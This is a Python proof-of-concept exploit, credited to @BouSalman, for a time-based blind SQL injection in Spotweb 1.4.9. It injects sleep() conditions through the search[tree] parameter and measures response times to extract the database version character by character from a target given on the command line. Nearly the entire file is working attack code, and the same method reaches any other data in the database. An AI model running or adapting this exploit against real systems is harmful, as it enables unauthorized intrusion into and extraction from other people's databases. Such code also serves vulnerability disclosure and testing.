import sys
import requests

##
##  POC for Time-Based SQL Injection on Spotweb Version 1.4.9
##  Discovered and Exploited by: @BouSalman
##  @2020

def get_version_length(ip):
    for i in range(5,50):
        injection_string = "cat0_z0_c')+OR+(SELECT+1+FROM+(SELECT+case+when+length(version())+=+%d+then+sleep(3)+else+0+end+AS+o+)o)+OR+('" % (i)
        target = "http://%s/?page=index&search[tree]=%s" % (ip,injection_string)
        r = requests.get (target) 
        if r.elapsed.total_seconds() > 2.00:
            return i
    return None 

def sqli(ip,injection_string):
    for j in range(32,126): 
        target = "http://%s/?page=index&search[tree]=%s" % (ip,injection_string.replace("[CHAR]",str(j)))
        r = requests.get (target) 
        if r.elapsed.total_seconds() > 2.00:
            return j
    return None 


def main():
    if len(sys.argv) != 2:
        print ("(+) usage: python %s <target>") % sys.argv[0]
        sys.exit(1)
    ip = sys.argv[1]
    print("Getting the version length...")
    version_length = get_version_length(ip)
    print(" => the Version length is: %s") % version_length

    print("Extracting Version token, please be patient ;> ...")
    version_token=''
    for position in range(1,version_length+1):
        injection_string = "cat0_z0_c')+OR+(SELECT 1 FROM (SELECT  case  when ascii(substr(version() FROM(%d)FOR(1))) = [CHAR] then sleep(3) else 0 end AS z )o)+OR+('" % (position)
        extracted_char=chr(sqli(ip,injection_string))
        version_token+=extracted_char
    print(" => the Version is: %s") % version_token




if __name__ == '__main__':
    main()
